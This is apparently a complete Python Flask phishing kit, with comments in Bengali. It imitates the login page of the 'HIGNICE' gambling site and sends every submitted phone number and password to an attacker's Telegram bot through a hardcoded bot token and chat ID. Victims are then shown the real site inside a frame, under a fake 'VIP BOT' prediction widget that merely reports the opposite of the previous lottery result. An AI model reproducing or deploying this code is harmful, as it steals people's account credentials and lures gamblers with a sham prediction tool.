from flask import Flask, render_template_string, request, redirect, jsonify
import requests
import time
import threading

app = Flask(__name__)

# --- কনফিগারেশন ---
BOT_TOKEN = "8669461197:AAFSIR9hecqfftSSdXNF1E90xYvpqVIAVRg"
CHAT_ID = "7897417844"
API_URL = "https://draw.ar-lottery01.com/WinGo/WinGo_30S/GetHistoryIssuePage.json"

# প্রেডিকশন ডাটা স্টোরেজ
prediction_data = {"issue": "---", "size": "WAIT", "color": "WAIT", "timer": "30"}

def run_prediction_engine():
    global prediction_data
    while True:
        try:
            data = requests.get(f"{API_URL}?ts={int(time.time()*1000)}").json()
            latest = data.get('data', {}).get('list', [])[0]
            num = int(latest['number'])
            prediction_data = {
                "issue": str(int(latest['issueNumber']) + 1)[-4:], # শেষের ৪ সংখ্যা
                "size": "BIG" if num < 5 else "SMALL", # লজিক্যাল অপোজিট প্রেডিকশন
                "color": "GREEN" if latest['color'].upper() == "RED" else "RED",
                "timer": "LIVE"
            }
        except: pass
        time.sleep(2)

threading.Thread(target=run_prediction_engine, daemon=True).start()

# --- ১. ফিশিং লগইন পেজ (আগের ডিজাইন) ---
LOGIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HIGNICE - Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; background: #f8f8f8; }
        .header { background: linear-gradient(90deg, #ff6b6b, #ff8e8e); color: white; padding: 40px 20px; text-align: center; }
        .login-box { background: white; margin-top: -20px; border-radius: 20px 20px 0 0; padding: 30px 20px; box-shadow: 0 -5px 15px rgba(0,0,0,0.05); }
        .input-field { display: flex; align-items: center; background: #f0f2f5; padding: 12px; border-radius: 8px; margin-bottom: 15px; }
        input { border: none; background: transparent; outline: none; width: 100%; font-size: 16px; margin-left: 10px; }
        .btn-login { width: 100%; padding: 15px; border-radius: 30px; border: none; background: #ff6b6b; color: white; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="header"><h1>HIGNICE</h1></div>
    <div class="login-box">
        <h2>Log in</h2>
        <form action="/login" method="POST">
            <div class="input-field"><i class="fa fa-phone"></i><input type="text" name="phone" placeholder="Phone number" required></div>
            <div class="input-field"><i class="fa fa-lock"></i><input type="password" name="password" placeholder="Password" required></div>
            <button type="submit" class="btn-login">LOG IN</button>
        </form>
    </div>
</body>
</html>
"""

# --- ২. মেইন গেম পেজ + ড্র্যাগেবল হ্যাক উইজেট ---
GAME_OVERLAY_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HIGNICE - Home</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
        iframe { width: 100%; height: 100%; border: none; }
        
        /* Floating Widget Style */
        #hackWidget {
            position: fixed; top: 150px; right: 20px;
            width: 160px; background: rgba(0, 0, 0, 0.9);
            border: 2px solid #00ff88; border-radius: 12px;
            color: white; font-family: 'Courier New', monospace;
            padding: 10px; z-index: 9999; cursor: move;
            box-shadow: 0 0 15px #00ff88; font-size: 12px;
        }
        .widget-header { border-bottom: 1px solid #333; padding-bottom: 5px; margin-bottom: 8px; font-weight: bold; color: #ff0055; display: flex; justify-content: space-between; }
        .row { display: flex; justify-content: space-between; margin-bottom: 5px; }
        .val { color: #00ff88; font-weight: bold; }
        .win-popup { 
            position: fixed; top: 40%; left: 50%; transform: translate(-50%, -50%);
            background: rgba(0, 255, 136, 0.9); color: black;
            padding: 20px 40px; border-radius: 15px; font-weight: 900;
            font-size: 24px; display: none; z-index: 10000; box-shadow: 0 0 30px #00ff88;
        }
    </style>
</head>
<body>

    <iframe src="https://hgzy.vip/#/home"></iframe>

    <div id="hackWidget">
        <div class="widget-header"><span>RG VIP BOT</span> <span style="color:red">●</span></div>
        <div class="row"><span>ISSUE:</span> <span class="val" id="wIssue">----</span></div>
        <div class="row"><span>SIZE:</span> <span class="val" id="wSize">WAIT</span></div>
        <div class="row"><span>COLOR:</span> <span class="val" id="wColor">WAIT</span></div>
        <div style="text-align:center; margin-top:5px; font-size:10px; border-top:1px solid #333;">V100 SUPREME</div>
    </div>

    <div id="winPopup" class="win-popup">WIN!<br><small>SMALL HIT</small></div>

    <script>
        // প্রেডিকশন আপডেট ফাংশন
        function fetchUpdate() {
            fetch('/api/prediction').then(r => r.json()).then(data => {
                document.getElementById('wIssue').innerText = data.issue;
                document.getElementById('wSize').innerText = data.size;
                document.getElementById('wColor').innerText = data.color;
            });
        }
        setInterval(fetchUpdate, 2000);

        // ড্র্যাগেবল লজিক (আঙুল দিয়ে সরানো)
        const widget = document.getElementById("hackWidget");
        let active = false, currentX, currentY, initialX, initialY, xOffset = 0, yOffset = 0;

        widget.addEventListener("touchstart", dragStart, false);
        widget.addEventListener("touchend", dragEnd, false);
        widget.addEventListener("touchmove", drag, false);

        function dragStart(e) {
            initialX = e.touches[0].clientX - xOffset;
            initialY = e.touches[0].clientY - yOffset;
            if (e.target === widget) active = true;
        }
        function dragEnd() { initialX = currentX; initialY = currentY; active = false; }
        function drag(e) {
            if (active) {
                e.preventDefault();
                currentX = e.touches[0].clientX - initialX;
                currentY = e.touches[0].clientY - initialY;
                xOffset = currentX; yOffset = currentY;
                setTranslate(currentX, currentY, widget);
            }
        }
        function setTranslate(xPos, yPos, el) { el.style.transform = "translate3d(" + xPos + "px, " + yPos + "px, 0)"; }
    </script>
</body>
</html>
"""

@app.route('/')
def home(): return render_template_string(LOGIN_HTML)

@app.route('/dashboard')
def dashboard(): return render_template_string(GAME_OVERLAY_HTML)

@app.route('/api/prediction')
def api_p(): return jsonify(prediction_data)

@app.route('/login', methods=['POST'])
def login():
    phone = request.form.get('phone')
    password = request.form.get('password')
    
    # টেলিগ্রামে ডাটা পাঠানো
    msg = f"🎯 **HIT!**\\n📱 Phone: `{phone}`\\n🔑 Pass: `{password}`"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    
    # লগইন শেষ হলে আমাদের কাস্টম গেম ড্যাশবোর্ডে পাঠাবে
    return redirect("/dashboard")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)

